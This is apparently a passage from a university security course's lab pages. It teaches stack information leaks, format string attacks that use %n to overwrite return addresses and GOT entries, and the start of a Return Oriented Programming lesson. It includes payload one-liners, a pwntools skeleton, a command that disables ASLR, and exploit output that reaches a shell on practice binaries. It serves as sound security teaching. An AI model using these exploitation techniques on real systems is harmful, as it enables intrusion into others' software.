   0x00000000004007aa &lt;+9&gt;:    mov    edi,0x4008bc
   0x00000000004007af &lt;+14&gt;:   call   0x400550 &lt;puts@plt&gt;
   0x00000000004007b4 &lt;+19&gt;:   mov    eax,0x0
   0x00000000004007b9 &lt;+24&gt;:   pop    rbp
   0x00000000004007ba &lt;+25&gt;:   ret    
End of assembler dump.
gdb-peda$  
</code></pre><p>From the GDB above, we determine that, after our buffer, there is the stored <code>rbp</code> (i.e. old rbp).</p><p>In 32-bit program there would (usually) be 2 leaked values:</p><ul><li><p>The old <code>ebp</code></p></li><li><p>The return address of the function</p></li></ul><p>This happens if the values of the old <code>ebp</code> and the return address don't have any <code>\x00</code> bytes.</p><p>in the 64-bit example we only get the old <code>rbp</code> because the 2 high bytes of the stack address are always <code>0</code> which causes the string to be terminated early.</p><p>When we leak the two values we are able to retrieve the stored <code>rbp</code> value. In the above run the value of <code>rbp</code> is <code>0x00007fffffffdc50</code>. We also see that the stored <code>rbp</code> value is stored at <strong>address</strong> <code>0x7fffffffdc40</code>, which is the address current <code>rbp</code>. We have the situation in the below diagram:</p><p><img src=https://ocw.cs.pub.ro/courses/_media/cns/labs/info-leak-stack-64.png alt></p><p>We marked the stored <code>rbp</code> value (i.e. the frame pointer for <code>main()</code>: <code>0x7fffffffdc50</code>) with the font color red in both places.</p><p>In short, if we leak the value of the stored <code>rbp</code> (i.e. the frame pointer for <code>main()</code>: <code>0x00007fffffffdc50</code>) we can determine the address of the current <code>rbp</code> (i.e. the frame pointer for <code>my_main()</code>: <code>0x7fffffffdc40</code>), by subtracting <code>16</code>. The address where the
<code>my_main()</code> return address is stored (<code>0x7fffffffdc48</code>) is computed by subtracting <code>8</code> from the leaked <code>rbp</code> value. By overwriting the value at this address we will force an arbitrary code execution and call <code>my_evil_func()</code>.</p><p>In order to write the return address of the <code>my_main()</code> function with the address of the <code>my_evil_func()</code> function, make use of the
conveniently (but not realistically) placed <code>my_memory_write()</code> function. The <code>my_memory_write()</code> allows the user to write arbitrary
values to arbitrary memory addresses.</p><p>Considering all of this, update the <code>TODO</code> lines of the <code>exploit.py</code> script to make it call the <code>my_evil_func()</code> function.</p><p>Same as above, use <code>nm</code> to determine address of the <code>my_evil_func()</code> function. When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint. The precompiled binary can be found in <a href=/courses/cns/resources/repo title=cns:resources:repo>the CNS public repository</a>.</p><p>Use the above logic to determine the <code>old rbp</code> leak and then the address of the <code>my_main()</code> return address.</p><p>See <a href=https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack title=https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack>here</a> examples of using the <code>unpack()</code> function.</p><p>In case of a successful exploit the program will spawn a shell in the <code>my_evil_func()</code> function, same as below:</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$ python exploit.py 
[!] Could not find executable &#39;info_leak&#39; in $PATH, using &#39;./info_leak&#39; instead
[+] Starting local process &#39;./info_leak&#39;: pid 6422
[*] old_rbp is 0x7fffffffdd40
[*] return address is located at is 0x7fffffffdd38
[*] Switching to interactive mode
Returning from main!
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
</code></pre><p>The rule of thumb is: <strong>Always know your string length.</strong></p><h4 id=format-string-attacks>Format String Attacks</h4><hr><p>We will now see how (im)proper use of <code>printf</code> may provide us with ways of extracting information or doing actual attacks.</p><p>Calling <code>printf</code> or some other string function that takes a format string as a parameter, directly with a string which is supplied by the user leads to a vulnerability called <strong>format string attack</strong>.</p><p>The definition of <code>printf</code>:</p><pre tabindex=0><code class=language-{.code data-lang={.code>int printf(const char *format, ...);
</code></pre><p>Let's recap some of <a href=http://www.cplusplus.com/reference/cstdio/printf/ title=http://www.cplusplus.com/reference/cstdio/printf/>useful formats</a>:</p><ul><li><p><code>%08x</code> &ndash; prints a number in hex format, meaning takes a number from the stack and prints in hex format</p></li><li><p><code>%s</code> &ndash; prints a string, meaning takes a pointer from the stack and prints the string from that address</p></li><li><p><code>%n</code> &ndash; writes the number of bytes written so far to the address given as a parameter to the function (takes a pointer from the stack). This format is not widely used but it is in the C standard.</p></li><li><p><code>%x</code> and <code>%n</code> are enough to have memory read and write and hence, to successfully exploit a vulnerable program that calls printf (or other format string function) directly with a string controlled by the user.
:::</p></li></ul><h3 id=example-2>Example 2</h3><pre tabindex=0><code class=language-{.code data-lang={.code>printf(my_string);
</code></pre><p>The above snippet is a good example of why ignoring compile time warnings is dangerous. The given example is easily detected by a static checker.</p><p>Try to think about:</p><ul><li><p>The peculiarities of <code>printf</code> (variable number of arguments)</p></li><li><p>Where <code>printf</code> stores its arguments (<em>hint</em>: on the stack)</p></li><li><p>What happens when <code>my_string</code> is <code>"%x"</code></p></li><li><p>How matching between format strings (e.g. the one above) and arguments is enforced (<em>hint</em>: it's not) and what happens in general when the number of arguments doesn't match the number of format specifiers</p></li><li><p>How we could use this to cause information leaks and arbitrary memory writes (<em>hint</em>: see the format specifiers at the beginning of the section)</p></li></ul><p>:::</p><h3 id=example-3>Example 3</h3><p>We would like to check some of the well known and not so-well known features of <a href=http://man7.org/linux/man-pages/man3/printf.3.html title=http://man7.org/linux/man-pages/man3/printf.3.html>the printf function</a>.
Some of them may be used for information leaking and for attacks such as format string attacks.</p><p>Go into <code>printf-features/</code> subfolder and browse the <code>printf-features.c</code> file. Compile the executable file using:</p><pre tabindex=0><code class=language-{.code data-lang={.code>make
</code></pre><p>and then run the resulting executable file using</p><pre tabindex=0><code class=language-{.code data-lang={.code>./printf-features
</code></pre><p>Go through the <code>printf-features.c</code> file again and check how print, length and conversion specifiers are used by <code>printf</code>. We will make use of the <code>%n</code> feature that allows memory writes, a requirement for attacks.
:::</p><h3 id=basic_format_string_attack class=sectionedit11>Basic Format String Attack</h3><p>You will now do a basic format string attack using the <code>03-basic-format-string/</code> subfolder. The source code is in <code>basic_format_string.c</code> and the executable is in <code>basic_format_string</code>.</p><p>You need to use <code>%n</code> to overwrite the value of the <code>v</code> variable to <code>0x300</code>. You have to do three steps:</p><p>1.Determine the address of the <code>v</code> variable using <code>nm</code>.</p><p>2.Determine the <code>n</code>-th parameter of <code>printf()</code> that you can write to using <code>%n</code>. The <code>buffer</code> variable will have to be that parameter; you will store the address of the <code>v</code> variable in the <code>buffer</code> variable.</p><p>3.Construct a format string that enables the attack; the number of characters processed by <code>printf()</code> until <code>%n</code> is matched will have to be <code>0x300</code>.</p><p>For the second step let's run the program multiple times and figure out where the <code>buffer</code> address starts. We fill <code>buffer</code> with the <code>aaaa</code> string and we expect to discover it using the <code>printf()</code> format specifiers.</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$  ./basic_format_string 
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
7fffffffdcc07fffffffdcc01f6022897ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25

$ ./basic_format_string 
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
x7fffffffdcc07fffffffdcc0116022917ffff7dd18d06c6c25786c6c25786c6c25786c6c25786c6c25786c6c25787fffffffdcc07fffffffdcc01f6022917ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a

$ ./basic_format_string 
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a4141414141414141
</code></pre><p>In the last run we get the <code>4141414141414141</code> representation of <code>AAAAAAAA</code>. That means that, if we replace the final <code>%lx</code> with <code>%n</code>, we will write at the address <code>0x4141414141414141</code> the number of characters processed so far:</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$ echo -n &#39;7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a&#39; | wc -c
162
</code></pre><p>We need that number to be <code>0x300</code>. You can fine tune the format string by using a construct such as <code>%32llx</code> to print a number on <code>32</code> characters instead of a maximum of <code>16</code> characters. See how much extra room you need and see if you reach <code>0x300</code> bytes.</p><p>The construct needn't use a multiple of <code>8</code> for length. You may use the <code>%32llx</code> or <code>%33llx</code> or <code>%42llx</code>. The numeric argument states the length of the print output.</p><p>After the plan is complete, write down the attack by filling the <code>TODO</code> lines in the <code>exploit.py</code> solution skeleton.</p><p>When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint. The precompiled binary can be found in <a href=/courses/cns/resources/repo title=cns:resources:repo>the CNS public repository</a>.</p><p>After you write 0x300 chars in v, you should obtain shell</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$ python exploit64.py 
[!] Could not find executable &#39;basic_format_string&#39; in $PATH, using &#39;./basic_format_string&#39; instead
[+] Starting local process &#39;./basic_format_string&#39;: pid 20785
[*] Switching to interactive mode
                                     7fffffffdcc0  7fffffffdcc01f60229b7ffff7dd18d03125786c6c393425786c6c25786c6c34786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25a6e25
$ 
</code></pre><h3 id=extraformat_string_attack class=sectionedit12>Extra: Format String Attack</h3><p>Go to the <code>04-format-string/</code> subfolder. In this task you will be working with a <strong>32-bit binary</strong>.</p><p>The goal of this task is to call <code>my_evil_func</code> again. This task is also tutorial based.</p><pre tabindex=0><code class=language-{.code data-lang={.code>int
main(int argc, char *argv[])
{
    printf(argv[1]);
    printf(&#34;\nThis is the most useless and insecure program!\n&#34;);
    return 0;
}
</code></pre><h4 id=transform_format_string_attack_to_a_memory_write>Transform Format String Attack to a Memory Write</h4><p>Any string that represents a useful format (e.g. <code>%d</code>, <code>%x</code> etc.) can be used to discover the vulnerability.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ ./format &#34;%08x %08x %08x %08x&#34;
00000000 f759d4d3 00000002 ffd59bd4
This is the most useless and insecure program!
</code></pre><p>The values starting with 0xf are very likely pointers. Again, we can use this vulnerability as a information leakage. But we want more.</p><p>Another useful format for us is <code>%m$</code> followed by any normal format selector. Which means that the <code>m</code>th parameter is used as an input for the following format. <code>%10$08x</code> will print the <code>10</code>th paramater with <code>%08x</code>. This allows us to do a precise access of the stack.</p><p>Example:</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ ./format &#34;%08x %08x %08x %08x %1\$08x %2\$08x %3\$08x %4\$08x&#34;
00000000 f760d4d3 00000002 ff9aca24 00000000 f760d4d3 00000002 ff9aca24
This is the most useless and insecure program!
</code></pre><p>Note the equivalence between formats.</p><p>Now, because we are able to select <em>any</em> higher address with this function and because the buffer is on the stack, sooner or later we will discover our own buffer.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ ./format &#34;$(python -c &#39;print(&#34;%08x\n&#34; * 10000)&#39;)&#34; 
</code></pre><p>Depending on your setup you should be able to view the hex
representation of the string &ldquo;%08x\n&rdquo;.</p><p><strong>Why do we need our own buffer?</strong> Remember the <code>%n</code> format? It can be used to write at an address given as parameter. The idea is to give this address as parameter and achieve memory writing. We will see later how to control the value.</p><p>The next steps are done with ASLR disabled. In order to disable ASLR,
please run</p><pre tabindex=0><code class=language-{.code data-lang={.code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre><p>By trial and error or by using GDB (breakpoint on <code>printf</code>) we can determine where the buffer starts</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ ./format &#34;$(python -c &#39;import sys; sys.stdout.buffer.write(b&#34;ABCD&#34; + b&#34;%08x\n   &#34; * 0x300)&#39;)&#34;  | grep -n 41 | head
10:   ffffc410
52:   ffffcc41
72:   ffffcf41
175:   44434241
</code></pre><p>Command line Python exploits tend to get very tedious and hard to read when the payload gets more complex. You can use the following reference pwntools script to write your exploit. The code is equivalent to the above one-liner.</p><pre tabindex=0><code class=language-{.code data-lang={.code>#!/usr/bin/env python3
 
from pwn import *
 
stack_items = 200
 
pad = b&#34;ABCD&#34;
val_fmt = b&#34;%08x\n   &#34;
# add a \n at the end for consistency with the command line run
fmt = pad + val_fmt * stack_items + b&#34;\n&#34;
 
io = process([&#34;./format&#34;, fmt])
 
io.interactive()
</code></pre><p>Then call the <code>format</code> using:</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$ python exploit.py
</code></pre><p>One idea is to keep things in multiple of 4, like &ldquo;%08x \n&rdquo;. If you are looking at line <code>175</code> we have <code>44434241</code> which is the base 16 representation of <code>“ABCD”</code> (because it's little endian). Note, you can add as many format strings you want, the start of the buffer will be the same (more or less).</p><p>We can compress our buffer by specifying the position of the argument.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ ./format $(python -c &#39;import sys; sys.stdout.buffer.write(b&#34;ABCD&#34; + b&#34;AAAAAAAA&#34; * 199 + b&#34;%175$08x&#34;)&#39;)
ABCDAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAA44434241
This is the most useless and insecure program!
</code></pre><p><code>b”AAAAAAAA” * 199</code> is added to maintain the length of the original string, otherwise the offset might change.</p><p>You can see that the last information is our b"ABCD" string printed with <code>%08x</code> this means that we know where our buffer is.</p><p>You need to enable core dumps in order to reproduce the steps below:</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>$ ulimit -c unlimited
</code></pre><p>The steps below work an a given version of libc and a given system. It's why the instruction that causes the fault is</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>mov %edx,(%eax)
</code></pre><p>or the equivalent in Intel syntax</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>mov DWORD PTR [eax], edx
</code></pre><p>It may be different on your system, for example <code>edx</code> may be replaced by <code>esi</code>, cuch as</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>mov DWORD PTR [eax], esi
</code></pre><p>Update the explanations below accordingly.</p><p>Remove any core files you may have generated before testing yourprogram:</p><pre tabindex=0><code class=language-{.code} data-lang={.code}>rm -f core
</code></pre><p>We can replace <code>%08x</code> with <code>%n</code> this should lead to segmentation fault.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ ./format &#34;$(python -c &#39;import sys; sys.stdout.buffer.write(b&#34;ABCD&#34; + b&#34;AAAAAAAA&#34; * 199 + b&#34;%175$08n&#34;)&#39;)&#34;
Segmentation fault (core dumped)
$ gdb ./format -c core
...
Core was generated by `./format BCDEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) bt
#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
#1  0xf7e5deff in printf () from /lib/i386-linux-gnu/libc.so.6
#2  0x08048468 in main (argc=2, argv=0xffffd2f4) at format.c:18
(gdb) x/i $eip
=&gt; 0xf7e580a2 &lt;vfprintf+17906&gt;:    mov    %edx,(%eax)
(gdb) info registers $edx $eax
edx            0x202    1596
eax            0x44434241   1145258561
(gdb) quit
</code></pre><p>Bingo. We have memory write. The vulnerable code tried to write at the address <code>0x44434241</code> (&ldquo;ABCD&rdquo; little endian) the value 1596. The value 1596 is the amount of data wrote so far by <code>printf</code>(<code>“ABCD” + 199 * “AAAAAAAA”</code>).</p><p>Right now, our input string has 1605 bytes (1604 with a <code>\n</code> at the end). But we can further compress it, thus making the value that we write independent of the length of the input.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ ./format &#34;$(python -c &#39;import sys; sys.stdout.buffer.write(&#34;ABCD&#34; + &#34;A&#34; * 1588 + &#34;%99x&#34; + &#34;%126$08n&#34;)&#39;)&#34;
Segmentation fault (core dumped)
$ gdb ./format -c core
(gdb) info registers $edx $eax
edx            0x261    1691
eax            0x44434241   1145258561
(gdb) quit
</code></pre><p>Here we managed to write 1691 (4+1588+99). Note we should keep the number of bytes before the format string the same. Which means that if we want to print with a padding of 100 (three digits) we should remove one <code>A</code>. You can try this by yourself.</p><p><strong>How far can we go?</strong> Probably we can use any integer for specifying the number of bytes which are used for a format, but we don't need this; moreover specifying a very large padding is not always feasible, think what happens when printing with <code>snprintf</code>. 255 should be enough.</p><p>Remember, we want to write a value to a certain address. So far we control the address, but the value is somewhat limited. If we want to write 4 bytes at a time we can make use of the endianess of the machine. <strong>The idea</strong> is to write at the address n and then at the address n+1 and so on.</p><p>Lets first display the address. We are using the address <code>0x804c014</code>. This address is the address of the got entry for the puts function. Basically, we will override the got entry for the puts.</p><p>Check the <code>exploit.py</code> script from the task directory, read the commends and understand what it does.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ python exploit.py
[*] &#39;format&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process &#39;./format&#39;: pid 29030
[*] Switching to interactive mode
[*] Process &#39;./format&#39; stopped with exit code 0 (pid 29030)
\x14\x04\x15\x04\x17\x04\x18\x04 804c014  804c015  804c017  804c018 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
This is the most useless and insecure program!
</code></pre><p>The output starts with <code>\x14\x04\x15\x04\x17\x04\x18\x04 804c014 804c015 804c017 804c018</code> which is the 4 addresses we have written (raw, little endian) followed by the numerical prints done with <code>%x</code> of the same addresses.</p><p>If you have the same output it means that now, if you replace <code>%x</code> with <code>%n</code> (change <code>fmt = write_fmt</code> in the script) it will try to write something at those valid addresses.</p><p>We want to put the value <code>0x080491a6</code>.</p><pre tabindex=0><code class=language-{.code data-lang={.code>$ objdump -d ./format | grep my_evil
080491a6 &lt;my_evil_func&gt;:
</code></pre><p>As <code>%n</code> writes how many characters have been printed until it is reached, each <code>%n</code> will print an incrementally larger value. We use the 4 adjacent adressess to write byte by byte and use overflows to reach a lower value for the next byte. For example, after writing <code>0xa6</code> we can write <code>0x0191</code>:</p><p><img src=https://ocw.cs.pub.ro/courses/_media/cns/labs/bytes_write.png alt></p><p>Also, the <code>%n</code> count doesn't reset so, if we want to write <code>0xa6</code> and then <code>0x91</code> the payload should be in the form of:</p><p><code>&lt;0xa6 bytes>%n&lt;0x100 - 0xa6 + 0x91 bytes>%n</code></p><p>As mentioned earlier above, instead writing N bytes <code>“A” * N</code> you can use other format strings like <code>%Nc</code> or <code>%Nx</code> to keep the payload shorter.</p><p>Bonus task** Can you get a shell? (Assume ASLR is disabled).</p><h4 id=mitigation-and-recommendations>Mitigation and Recommendations</h4><hr><ol><li><p>Manage the string length carefully</p></li><li><p>Don't use <code>gets</code>. With <code>gets</code> there is no way of knowing how much data was read</p></li><li><p>Use string functions with <code>n</code> parameter, whenever a non constant string is involved. i.e. <code>strnprintf</code>, <code>strncat</code>.</p></li><li><p>Make sure that the <code>NUL</code> byte is added, for instance <code>strncpy</code> does <strong>not</strong> add a <code>NUL</code> byte.</p></li><li><p>Use <code>wcstr*</code> functions when dealing with wide char strings.</p></li><li><p>Don't trust the user!</p></li></ol><h4 id=real-life-examples>Real life Examples</h4><hr><ul><li><p><a href=http://xkcd.com/1354/ title=http://xkcd.com/1354/>Heartbleed</a>
Linux kernel through 3.9.4 <a href=http://www.cvedetails.com/cve/CVE-2013-2851/ title=http://www.cvedetails.com/cve/CVE-2013-2851/>CVE-2013-2851</a>. The fix is <a href="http://marc.info/?l=linux-kernel&m=137055204522556&w=2" title="http://marc.info/?l=linux-kernel&m=137055204522556&w=2">here</a>. More details <a href="http://www.intelligentexploit.com/view-details-ascii.html?id=16609" title="http://www.intelligentexploit.com/view-details-ascii.html?id=16609">here</a>.</p></li><li><p>Windows 7 <a href=http://www.cvedetails.com/cve/CVE-2012-1851/ title=http://www.cvedetails.com/cve/CVE-2012-1851/>CVE-2012-1851</a>.</p></li><li><p>Pidgin off the record plugin <a href=http://www.cvedetails.com/cve/CVE-2012-2369 title=http://www.cvedetails.com/cve/CVE-2012-2369>CVE-2012-2369</a>. The fix is <a href="https://bugzilla.novell.com/show_bug.cgi?id=762498#c1" title="https://bugzilla.novell.com/show_bug.cgi?id=762498#c1">here</a></p></li></ul><h3 id=resources>Resources</h3><hr><p><a href=http://www.cert.org/books/secure-coding/ title=http://www.cert.org/books/secure-coding/>Secure Coding in C and C++</a>
<a href="http://www.informit.com/articles/article.aspx?p=2036582" title="http://www.informit.com/articles/article.aspx?p=2036582">String representation in C</a>
<a href=https://www.owasp.org/index.php/Improper_string_length_checking title=https://www.owasp.org/index.php/Improper_string_length_checking>Improper string length checking</a>
<a href=http://cwe.mitre.org/data/definitions/134.html title=http://cwe.mitre.org/data/definitions/134.html>Format String definition</a>
<a href=https://www.owasp.org/index.php/Format_string_attack title=https://www.owasp.org/index.php/Format_string_attack>Format String Attack (OWASP)</a>
<a href=http://projects.webappsec.org/w/page/13246926/Format%20String title=http://projects.webappsec.org/w/page/13246926/Format%20String>Format String Attack (webappsec)</a>
<a href=http://www.gratisoft.us/todd/papers/strlcpy.html title=http://www.gratisoft.us/todd/papers/strlcpy.html>strlcpy and strlcat - consistent, safe, string copy and concatenation.</a> - This resource is useful to understand some of the string manipulation problems.</p><hr><p>Except where otherwise noted, content on this page is licensed under the
following license: <a href=https://creativecommons.org/licenses/by-sa/4.0/deed.en>CC Attribution-Share Alike 4.0 International</a></p></div><div class=td-content style=page-break-before:always><h1 id=pg-fb4dc1c874ad98c377903ad9a0a00dd7>7 -</h1><h1 id=return-oriented-programming>Return Oriented Programming</h1><h2 id=table-of-contents>Table of Contents</h2><ul><li><a href=#prerequisites>Prerequisites</a></li><li><a href=#recap---aslr>Recap - ASLR</a></li><li><a href=#solution---got-and-plt>Solution - GOT and PLT</a><ul><li><a href=#further-inspection>Further Inspection</a></li></ul></li><li><a href=#return-oriented-programming-rop>Return Oriented Programming (ROP)</a><ul><li><a href=#motivation>Motivation</a></li><li><a href=#nop-analogy>NOP Analogy</a></li></ul></li><li><a href=#gadgets-and-rop-chains>Gadgets and ROP Chains</a><ul><li><a href=#code-execution>Code Execution</a></li><li><a href=#changing-register-values>Changing Register Values</a></li><li><a href=#clearing-the-stack>Clearing the Stack</a></li></ul></li><li><a href=#some-useful-tricks>Some Useful Tricks</a><ul><li><a href=#memory-spraying>Memory Spraying</a></li><li><a href=#checksec-in-pwndbg>checksec in pwndbg</a></li><li><a href=#finding-gadgets-in-pwndbg>Finding Gadgets in pwndbg</a></li></ul></li><li><a href=#further-reading>Further Reading</a><ul><li><a href=#linux-x86-program-start-up>Linux x86 Program Start Up</a></li><li><a href=#the-pltsec-schema>The .plt.sec Schema</a><ul><li><a href=#more-about-cet-and-endbr>More about CET and endbr</a></li><li><a href=#tldr>TLDR</a></li></ul></li></ul></li><li><a href=#putting-it-all-together-demo>Putting it all Together: Demo</a><ul><li><a href=#calling-a-function>Calling a Function</a></li><li><a href=#calling-a-function-with-parameters>Calling a Function with Parameters</a></li><li><a href=#calling-multiple-functions>Calling Multiple Functions</a><ul><li><a href=#finding-gadgets---ropgadget>Finding Gadgets - ROPgadget</a></li></ul></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#01-tutorial---bypass-nx-stack-with-return-to-libc>01. Tutorial - Bypass NX Stack with return-to-libc</a></li><li><a href=#02-challenge---ret-to-libc>02. Challenge - ret-to-libc</a></li><li><a href=#03-challenge---no-ret-control>03. Challenge - no-ret-control</a></li><li><a href=#04-challenge---ret-to-plt>04. Challenge - ret-to-plt</a></li><li><a href=#05-challenge---gadget-tutorial>05. Challenge - gadget tutorial</a></li><li><a href=#06-bonus-challenge---echo-service>06. Bonus Challenge - Echo service</a></li></ul></li><li><a href=#conclusions>Conclusions</a></li></ul><h2 id=prerequisites>Prerequisites</h2><p>In order to fully grasp the content of this session, you should have a good
understanding of the following topics, both theoretically and practically:</p><ul><li>Stack frame</li><li>Shellcodes</li><li>ASLR</li><li>DEP</li><li><code>pwntools</code></li></ul><p>If you are unfamiliar with any of the above concepts or if your understanding of
them is fuzzy, go over their corresponding sessions once again, before you
proceed with the current session.</p><h2 id=recap---aslr>Recap - ASLR</h2><p>ASLR is not the only feature that prevents the compiler and the linker from
solving some relocations before the binary is actually running. Shared libraries
can also be combined in different ways. Thus, the time when the loader is
running is actually the first time you get to know the address of a shared
library. The ASLR feature is orthogonal to this - the loader could choose to
assign the addresses to libraries in a round-robin fashion, or could use ASLR to
assign them randomly.</p><p>Of course, we might be inclined to have the loader simply fix all relocations in
the code section after it loaded the libraries, but this breaks the memory
access protection of the <code>.text</code> section, which should only be <strong>readable</strong> and
<strong>executable</strong>.</p><h2 id=solution---got-and-plt>Solution - GOT and PLT</h2><p>In order to solve this issue, we need another level of indirection. Through this
new level, all accesses to symbols located in shared libraries will read the
actual address from a table at runtime. This table is called the
<strong>Global Offset Table (<code>.got</code>)</strong>. The one who populates this table is the
loader. Note that this can work both for data accesses, as well as for function
calls. However, function calls are actually using a small stub (i.e., a few
instructions) stored in the <strong>Procedure Linkage Table (<code>.plt</code>)</strong>.</p><p>The PLT is responsible of finding the shared library function address when it is
first called (<strong>lazy binding</strong>), and writing it to a GOT entry. Note that the
function pointers are stored in <code>.got.plt</code>). The following calls use the
pre-resolved address.</p><p>Let&rsquo;s take a quick look at the code generated for a shared library call. We&rsquo;ll
be using the binary compiled from the code below, which simply calls <code>puts()</code>.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#include</span> <span style=color:#8f5902;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#8f5902;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>main</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>void</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>{</span>
</span></span><span style=display:flex><span>	<span style=color:#000>puts</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Hello world!&#34;</span><span style=color:#000;font-weight:700>);</span>
</span></span><span style=display:flex><span>	<span style=color:#204a87;font-weight:700>return</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>;</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span>
</span></span></code></pre></div><p>After compiling this code, let&rsquo;s look at the call to <code>puts()</code>:</p><pre tabindex=0><code>$ objdump -D -j .text -M intel hello | grep puts
80483e4:	e8 07 ff ff ff       	call   80482f0 &lt;puts@plt&gt;
</code></pre><p>If we look at the <code>.plt</code> section, we see that it starts at address <code>0x080482e0</code>,
right where the previous call jumps:</p><pre tabindex=0><code>$ readelf --sections hello
[...]
  [12] .plt              PROGBITS        080482e0 0002e0 000040 04  AX  0   0 16
[...]
</code></pre><p>Now let&rsquo;s see how the code in <code>.plt</code> looks like:</p><pre tabindex=0><code>$ objdump -D -j .plt -M intel hello | grep -A 3 &#39;&lt;puts@plt&gt;&#39;
080482f0 &lt;puts@plt&gt;:
 80482f0:	ff 25 00 a0 04 08    	jmp    DWORD PTR ds:0x804a000
 80482f6:	68 00 00 00 00       	push   0x0
 80482fb:	e9 e0 ff ff ff       	jmp    80482e0 &lt;_init+0x30&gt;
</code></pre><p>We see this code performing a jump to address <code>0x804a000</code> inside the data
section. Let&rsquo;s check the binary relocations for that location:</p><pre tabindex=0><code>$ readelf --relocs hello
[...]
Relocation section &#39;.rel.plt&#39; at offset 0x298 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   puts
[...]
</code></pre><p>Ok, good, but what is actually stored at this address initially?</p><pre tabindex=0><code>$ objdump -s -M intel -j .got.plt --start-address=0x0804a000 hello

hello:     file format elf32-i386
 
Contents of section .got.plt:
 804a000 f6820408 06830408 16830408           ............
</code></pre><p>We recognize <code>f6820408</code> (<code>0x80482f6</code>) as being the next instruction in the
<code>puts@plt</code> stub that we disassembled above. Which then pushes 0 in the stack and
calls 0x80482e0. This is the call to the one-time resolver, and it looks like
this:</p><pre tabindex=0><code>$ objdump -D -j .plt -M intel hello | grep -A 3 &#39;080482e0&#39;

080482e0 &lt;puts@plt-0x10&gt;:
 80482e0:	ff 35 f8 9f 04 08    	push   DWORD PTR ds:0x8049ff8
 80482e6:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 80482ec:	00 00                	add    BYTE PTR [eax],al
</code></pre><p>What&rsquo;s going on here? What&rsquo;s actually happening is lazy binding - by convention
when the dynamic linker loads a library, it will put an identifier and
resolution function into known places in the GOT. Therefore, what happens is
roughly this: on the first call of a function, it falls through to call the
default stub, it simply jumps to the next instruction. The identifier is pushed
on the stack, the dynamic linker is called, which at that point has enough
information to figure out “hey, this program is trying to find the function
foo”. It will go ahead and find it, and then patch the address into the GOT such
that the next time the original PLT entry is called, it will load the actual
address of the function, rather than the lookup stub. Ingenious!</p><h3 id=further-inspection>Further Inspection</h3><p>Going further into the resolver is left as an exercise. You can use GDB to
inspect the address in <code>0x8049ffc</code>, and what happens when this jumps there.</p><h2 id=return-oriented-programming-rop>Return Oriented Programming (ROP)</h2><h3 id=motivation>Motivation</h3><p>In the previous sessions we discussed <code>ret2libc</code> attacks. The standard attack
was to perform an overwrite in the following way:</p><pre tabindex=0><code>RET + 0x00:   addr of system
RET + 0x04:   JUNK
